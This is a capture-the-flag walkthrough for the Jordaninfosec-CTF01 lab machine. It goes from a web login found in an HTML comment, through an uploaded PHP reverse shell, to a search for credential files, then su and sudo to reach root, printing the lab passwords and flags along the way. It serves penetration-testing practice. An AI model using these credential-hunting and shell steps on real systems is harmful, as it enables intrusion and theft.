# Jordaninfosec-CTF01

Let’s check the IP address of the victim machine →

![Untitled](/Vulnhub-Files/img/Jordaninfosec-CTF01/Untitled.png)

```bash
IP : 10.0.2.46 
```

## Port Scan Results ⤵️

```bash

```

## Web Enumeration ⤵️

![Untitled](/Vulnhub-Files/img/Jordaninfosec-CTF01/Untitled%201.png)

![Untitled](/Vulnhub-Files/img/Jordaninfosec-CTF01/Untitled%202.png)

hint.txt —>

![Untitled](/Vulnhub-Files/img/Jordaninfosec-CTF01/Untitled%203.png)

![Untitled](/Vulnhub-Files/img/Jordaninfosec-CTF01/Untitled%204.png)

```jsx
<!--	username : admin
	password : 3v1l_H@ck3r
	The 2nd flag is : {7412574125871236547895214}
-->
```

Lets login into this site —> 

![Untitled](/Vulnhub-Files/img/Jordaninfosec-CTF01/Untitled%205.png)

and now upload the reverse shell file here —>

![Untitled](/Vulnhub-Files/img/Jordaninfosec-CTF01/Untitled%206.png)

As ⬆️ I got success in uploading the files so lets load that shell file ➡️

```jsx
URL --> http://10.0.2.46/uploaded_files/shell.php
```

In response to that I got this —> 

![Untitled](/Vulnhub-Files/img/Jordaninfosec-CTF01/Untitled%207.png)

Actually, this statement of hidden file was a little misleading, because the file we are looking for was not hidden… I tried to search for user, pass, etc… files, but unfortunately, none of them worked. Lastly, I tried `find / -name cred*`, which revealed the /etc/mysql/conf.d/credentials.txt file.

```jsx
www-data@Jordaninfosec-CTF01:/$ find / -name cred* 2>/dev/null
/sys/kernel/slab/cred_jar
/usr/share/man/man7/credentials.7.gz
/usr/share/doc/git/contrib/credential
/usr/src/linux-headers-4.4.0-31/include/linux/cred.h
/usr/src/linux-headers-4.4.0-210/include/linux/cred.h
/usr/src/linux-headers-4.4.0-72/include/linux/cred.h
/etc/mysql/conf.d/credentials.txt
www-data@Jordaninfosec-CTF01:/$
www-data@Jordaninfosec-CTF01:/$ cat /etc/mysql/conf.d/credentials.txt
cat /etc/mysql/conf.d/credentials.txt
The 4th flag is : {7845658974123568974185412}

username : technawi
password : 3vilH@ksor
www-data@Jordaninfosec-CTF01:/$
```

Now thank god I got the credentials I was pissed so bad —>

```jsx
www-data@Jordaninfosec-CTF01:/$ su technawi
su technawi
Password: 3vilH@ksor

technawi@Jordaninfosec-CTF01:/$ whoami
whoami
technawi
technawi@Jordaninfosec-CTF01:/$
```

Now lets see how technawi can lead me to root —>

```jsx
technawi@Jordaninfosec-CTF01:/$ sudo -l
sudo -l
[sudo] password for technawi: 3vilH@ksor

Matching Defaults entries for technawi on Jordaninfosec-CTF01:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User technawi may run the following commands on Jordaninfosec-CTF01:
    (ALL : ALL) ALL
technawi@Jordaninfosec-CTF01:/$
```

Now its root time ➡️

```jsx
technawi@Jordaninfosec-CTF01:/$ sudo /bin/bash -i
sudo /bin/bash -i
root@Jordaninfosec-CTF01:/# whoami
whoami
root
root@Jordaninfosec-CTF01:/#
```

Let’s find out the last flag ➡️

```jsx
root@Jordaninfosec-CTF01:/var/www/html# cat flag.txt
cat flag.txt
The 5th flag is : {5473215946785213456975249}

Good job :)

You find 5 flags and got their points and finish the first scenario....
root@Jordaninfosec-CTF01:/var/www/html#
```